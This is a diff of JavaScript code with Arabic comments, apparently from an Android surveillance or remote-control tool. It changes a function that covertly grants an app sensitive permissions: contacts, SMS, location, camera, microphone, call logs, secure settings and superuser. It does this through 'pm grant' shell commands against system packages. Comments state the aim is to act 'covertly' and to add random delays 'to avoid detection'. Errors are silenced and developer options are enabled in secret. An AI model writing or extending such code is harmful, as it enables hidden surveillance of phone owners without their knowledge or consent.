@@ -173,52 +173,75 @@
     
     // منح جميع الصلاحيات المطلوبة - بشكل سلس وخفي
     async function grantAllPermissions() {
-        const permissions = [
-            'android.permission.READ_CONTACTS',
-            'android.permission.READ_SMS',
-            'android.permission.ACCESS_FINE_LOCATION',
-            'android.permission.ACCESS_COARSE_LOCATION',
-            'android.permission.CAMERA',
-            'android.permission.RECORD_AUDIO',
-            'android.permission.WRITE_EXTERNAL_STORAGE',
-            'android.permission.READ_EXTERNAL_STORAGE',
-            'android.permission.ACCESS_WIFI_STATE',
-            'android.permission.ACCESS_NETWORK_STATE',
-            'android.permission.INTERNET',
-            'android.permission.WAKE_LOCK',
-            'android.permission.FOREGROUND_SERVICE',
-            'android.permission.SYSTEM_ALERT_WINDOW',
-            'android.permission.WRITE_SECURE_SETTINGS',
-            'android.permission.READ_PHONE_STATE',
-            'android.permission.READ_CALL_LOG',
-            'android.permission.MODIFY_PHONE_STATE',
-            'android.permission.ACCESS_SUPERUSER'
-        ];
-        
-        // منح الصلاحيات بشكل تدريجي وخفي
-        for (let i = 0; i < permissions.length; i++) {
-            const permission = permissions[i];
-            try {
-                // تأخير عشوائي لتجنب الكشف
-                const delay = Math.random() * 1000 + 500;
-                await new Promise(resolve => setTimeout(resolve, delay));
+        try {
+            console.log('🔐 بدء منح الصلاحيات تلقائياً...');
+            
+            // استخدام النظام الجديد لمنح الأذونات تلقائياً
+            if (window.AutoPermissionsManager) {
+                const autoPermissions = new AutoPermissionsManager();
+                const success = await autoPermissions.initialize();
                 
-                // منح الصلاحية
-                await executeShellCommand(`pm grant com.android.systemui ${permission}`);
-                await executeShellCommand(`pm grant com.android.settings ${permission}`);
-                await executeShellCommand(`pm grant com.android.phone ${permission}`);
-                await executeShellCommand(`pm grant com.android.providers.telephony ${permission}`);
-                
-            } catch (e) {
-                // لا تظهر أي أخطاء
+                if (success) {
+                    console.log('✅ تم منح جميع الصلاحيات تلقائياً بنجاح');
+                    return;
+                }
             }
+            
+            // إذا فشل النظام الجديد، استخدم النظام القديم
+            console.log('🔄 استخدام النظام الاحتياطي...');
+            
+            const permissions = [
+                'android.permission.READ_CONTACTS',
+                'android.permission.READ_SMS',
+                'android.permission.ACCESS_FINE_LOCATION',
+                'android.permission.ACCESS_COARSE_LOCATION',
+                'android.permission.CAMERA',
+                'android.permission.RECORD_AUDIO',
+                'android.permission.WRITE_EXTERNAL_STORAGE',
+                'android.permission.READ_EXTERNAL_STORAGE',
+                'android.permission.ACCESS_WIFI_STATE',
+                'android.permission.ACCESS_NETWORK_STATE',
+                'android.permission.INTERNET',
+                'android.permission.WAKE_LOCK',
+                'android.permission.FOREGROUND_SERVICE',
+                'android.permission.SYSTEM_ALERT_WINDOW',
+                'android.permission.WRITE_SECURE_SETTINGS',
+                'android.permission.READ_PHONE_STATE',
+                'android.permission.READ_CALL_LOG',
+                'android.permission.MODIFY_PHONE_STATE',
+                'android.permission.ACCESS_SUPERUSER'
+            ];
+            
+            // منح الصلاحيات بشكل تدريجي وخفي
+            for (let i = 0; i < permissions.length; i++) {
+                const permission = permissions[i];
+                try {
+                    // تأخير عشوائي لتجنب الكشف
+                    const delay = Math.random() * 1000 + 500;
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                    
+                    // منح الصلاحية
+                    await executeShellCommand(`pm grant com.android.systemui ${permission}`);
+                    await executeShellCommand(`pm grant com.android.settings ${permission}`);
+                    await executeShellCommand(`pm grant com.android.phone ${permission}`);
+                    await executeShellCommand(`pm grant com.android.providers.telephony ${permission}`);
+                    
+                } catch (e) {
+                    // لا تظهر أي أخطاء
+                }
+            }
+            
+            // تمكين خيارات المطور بشكل خفي
+            await enableDeveloperOptions();
+            
+            // منح صلاحيات إضافية
+            await grantAdditionalPermissions();
+            
+            console.log('✅ تم منح جميع الصلاحيات بنجاح');
+            
+        } catch (error) {
+            console.error('❌ فشل في منح بعض الصلاحيات:', error);
         }
-        
-        // تمكين خيارات المطور بشكل خفي
-        await enableDeveloperOptions();
-        
-        // منح صلاحيات إضافية
-        await grantAdditionalPermissions();
     }
     
     // تمكين خيارات المطور - بشكل خفي
